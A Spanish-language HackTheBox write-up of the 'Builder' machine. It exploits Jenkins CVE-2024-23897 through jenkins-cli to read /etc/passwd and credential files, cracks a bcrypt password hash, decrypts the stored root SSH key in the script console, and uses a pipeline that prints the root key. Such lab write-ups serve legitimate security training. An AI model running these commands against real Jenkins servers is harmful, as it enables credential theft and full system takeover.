+++ 
draft = false
date = 2025-12-20T20:19:28Z
title = "Builder Machine - HackTheBox"
description = ""
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Linux
----------------
# Enumeración Nmap

**Comando:**

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.74 -oG allPorts
```
<img src="/images/Pasted image 20250926155642.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos información importante, como la versión de Jetty 10.0.18, y que se utiliza Jenkins

# Enumeración puerto HTTP 8080

Utilizando la herramienta whatweb sobre el puerto 8080 nos encontramos con la versión de Jenkins 2.441

<img src="/images/Pasted image 20250926160057.png" style="width:100%; height:auto; display:block; margin:auto;">

Viendo la página web nos muestra el dashboard de Jenkins

<img src="/images/Pasted image 20250926164333.png" style="width:100%; height:auto; display:block; margin:auto;">También nos muestra que hay un apartado de "Credentials", donde nos muestra está creado un SSH RSA para el usuario root

<img src="/images/Pasted image 20250926164709.png" style="width:100%; height:auto; display:block; margin:auto;">

Además nos muestra un usuario válido "jennifer"

<img src="/images/Pasted image 20250926164747.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotación LFI CVE-2024-23897

Si buscamos por la versión de Jenkins encontramos un LFI

<img src="/images/Pasted image 20250926165017.png" style="width:100%; height:auto; display:block; margin:auto;">Hay un script que permite realizar la vulnerabilidad, pero también hay una forma manual de utilizarla:

https://github.com/vulhub/vulhub/blob/master/jenkins/CVE-2024-23897/README.md

Para hacerlo primero debemos command-line client "jeknkins-cli.jar"

```bash
curl http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar
```

ó

```bash
wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
```

Ahora podemos leer los archivos con el siguiente comando

```bash
java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node "@/etc/passwd"
```

## Archivos de usuario

Como conseguimos realizar un LFI ahora podemos leer archivos críticos de jenkins
el archivo `/var/jenkins_home/users/users.xml` contiene nombres de usuarios de jenkins con el nombre de su directorio, en este caso `jennifer_12108429903186576833`
**Comando:**

```bash
java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node "@/var/jenkins_home/users/users.xml"
```
<img src="/images/Pasted image 20250926173246.png" style="width:100%; height:auto; display:block; margin:auto;">

Sabiendo el nombre del directorio podemos ver su archivo de configuración en

`/var/jenkins_home/users/<nombre_usuario>_.../config.xml`

**Comando:**

```bash
java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
```
Donde encontramos el hash de la contraseña de jennifer

<img src="/images/Pasted image 20250926173553.png" style="width:100%; height:auto; display:block; margin:auto;">

Que es `jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a`
Lo guardaremos en hash.txt, y utilizamos john para desencriptarla
**Comando:**

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
<img src="/images/Pasted image 20250926173752.png" style="width:100%; height:auto; display:block; margin:auto;">

Con las credenciales: `jennifer:princess` nos conectaremos al login de Jenkins

<img src="/images/Pasted image 20250926173917.png" style="width:100%; height:auto; display:block; margin:auto;">

# Obtención consola root

## Método 1:

El fichero /var/jenkins_home/credentials.xml  almacena todas las credenciales que Jenkins utiliza para interactuar con otros servicios (claves SSH, contraseñas de bases de datos, tokens de API, etc. Las contraseñas están cifradas pero desde la página web http://10.10.11.10:8080/script se puede desencriptar la rsa key

Haremos el siguiente comando para obtener la PrivateKey encripatada
**Comando:**

```bash
java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node "@/var/jenkins_home/credentials.xml"
```
<img src="/images/Pasted image 20250926174737.png" style="width:100%; height:auto; display:block; margin:auto;">

Al final aparece el usuario dueño dela private key, en este caso root

<img src="/images/Pasted image 20250926182636.png" style="width:100%; height:auto; display:block; margin:auto;">

Copiamos solo lo que está dentro de `<privateKey>` y lo guardamos en un archivo llamado rsa.txt

<img src="/images/rsajenkins.PNG" style="width:100%; height:auto; display:block; margin:auto;">

y para eliminar los espacios de la rsa.txt haremos el siguiente comando
**Comando:**
```bash
cat rsa.txt | tr -d '\n' > rsa.key
```

Ahora vamos a `http://10.10.11.10:8080/script` en la consola debemos pegar la siguiente línea: `println(hudson.util.Secret.fromString("{XXX=}").getPlainText())` donde las XXX son el texto copiado en rsa.key

```
println(hudson.util.Secret.fromString("{XXX=}").getPlainText())
```

Al correrlo obtendremos la RSA de root

<img src="/images/Pasted image 20250926182319.png" style="width:100%; height:auto; display:block; margin:auto;">

copiamos la RSA y creamos id_rsa en nuestra máquina local, y le damos permiso 600

<img src="/images/Pasted image 20250926182410.png" style="width:100%; height:auto; display:block; margin:auto;">

y luegos nos conectamos con el siguiente comando
**Comando:**
```bash
ssh root@10.10.11.10 -i id_rsa
```

<img src="/images/Pasted image 20250926182448.png" style="width:100%; height:auto; display:block; margin:auto;">

## Método 2:

Como encontramos http://10.10.11.10:8080/credentials anteriormente en [[#Enumeración puerto HTTP 8080]], vamos a ese recurso ahora que estámos logueados
damos click a los iconos y llegamos a http://10.10.11.10:8080/manage/credentials/store/system/domain/_/
Le damos a la llave que aparece a la derecha

<img src="/images/Pasted image 20250926183552.png" style="width:100%; height:auto; display:block; margin:auto;">

y en inspeccionar vemos "Concealed for Confidentiality"

<img src="/images/Pasted image 20250926183631.png" style="width:100%; height:auto; display:block; margin:auto;">

Copiamos el value que aparece ahí

<img src="/images/Pasted image 20250926183653.png" style="width:100%; height:auto; display:block; margin:auto;">

creamos un rsa.txt en nuestra máquina local

<img src="/images/Pasted image 20250926183818.png" style="width:100%; height:auto; display:block; margin:auto;">

vamos a http://10.10.11.10/script y pegamos el siguiente código
```
println(hudson.util.Secret.decrypt("{XXX=}"))
```

y obtenemos el id_rsa

<img src="/images/Pasted image 20250926183959.png" style="width:100%; height:auto; display:block; margin:auto;">

## Método 3:

Primeto vemos la siguiente ruta http://10.10.11.10:8080/manage/pluginManager/installed en busca de los plugins de SSH instalados

<img src="/images/Pasted image 20250926184438.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora en el dashboard le damos a "Create a job"

<img src="/images/Pasted image 20250926184517.png" style="width:100%; height:auto; display:block; margin:auto;">Creamos una Pipeline con cualquier nombre

<img src="/images/Pasted image 20250926184544.png" style="width:100%; height:auto; display:block; margin:auto;">Bajamos hacia Pipeline script y pegamos el siguiente código, recordando cambiar la ip y usuario según corresponda
```
pipeline {
    agent any
    stages {
        stage('SSH') {
            steps {
                script {
                    sshagent(credentials: ['1']) {
                        sh 'ssh -o StrictHostKeyChecking=no root@10.10.11.10 "cat /root/.ssh/id_rsa"'
                    }
                }
            }
        }
    }
}
```

Le damos a sabe y luego a build Now

<img src="/images/Pasted image 20250926184837.png" style="width:100%; height:auto; display:block; margin:auto;">

En build history le damos click

<img src="/images/Pasted image 20250926184900.png" style="width:100%; height:auto; display:block; margin:auto;">

y luego le damos a Console Output

<img src="/images/Pasted image 20250926184918.png" style="width:100%; height:auto; display:block; margin:auto;">

y nos da el id_rsa de output

<img src="/images/Pasted image 20250926184937.png" style="width:100%; height:auto; display:block; margin:auto;">

# Pwneo de la máquina

Nos conectamos como lo hicimos anteriormente  con el id_rsa
y obtenemos la flag de usuario

<img src="/images/Pasted image 20250926185141.png" style="width:100%; height:auto; display:block; margin:auto;">

y la flag de root

<img src="/images/Pasted image 20250926185200.png" style="width:100%; height:auto; display:block; margin:auto;">
y pwneamos la máquina
